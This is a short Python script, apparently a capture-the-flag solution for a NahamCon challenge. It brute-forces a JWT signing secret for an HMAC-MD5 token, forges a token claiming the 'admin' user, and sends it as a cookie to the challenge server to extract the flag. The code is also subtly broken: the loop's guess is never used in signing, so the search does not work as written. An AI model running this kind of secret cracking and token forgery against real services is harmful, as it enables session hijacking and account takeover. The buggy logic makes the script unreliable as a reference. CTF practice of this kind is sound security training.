import jwt
import requests
import itertools
import string
import base64
import hmac




def checkguess(my_guess):
    test_token="eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.MWU4ZDk0NDg0YTY0YWI5NzE4NmEyZWQ0ODRjMjdkYTU"
    token="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0"

    trying="fsrwjcfszeg"+"vsyfa"

    # x= hmac.new(trying.encode("utf-8"), token.encode("utf-8"),"md5").hexdigest()
    header = '{"alg":"MD5_HMAC"}'
    payload = '{"username":"admin"}'
    header = base64.urlsafe_b64encode(bytes(str(header), 'utf-8')).decode().replace("=", "")
    payload = base64.urlsafe_b64encode(bytes(str(payload), 'utf-8')).decode().replace("=", "")
    signature = hmac.new(bytes(trying, 'utf-8'), bytes(header + '.' + payload, 'utf-8'), digestmod='md5').digest()
    sigb64 = base64.urlsafe_b64encode(bytes(signature)).decode().replace("=", "")

    # print(sigb64,"V08QdwNYKwlgN3GPFUI3lQ")


    if sigb64== "V08QdwNYKwlgN3GPFUI3lQ":
        print("Password is: {0}".format(''.join(my_guess)))
        resp=requests.get("http://challenge.nahamcon.com:30998",cookies={"token":header+"."+payload+"."+sigb64})
        print(resp.text[resp.text.find("flag{"):])
        return True
    # else:
    #     return False



for x in itertools.product(string.ascii_lowercase,repeat=5):
    if checkguess("".join(x)):
        break


print('finished')
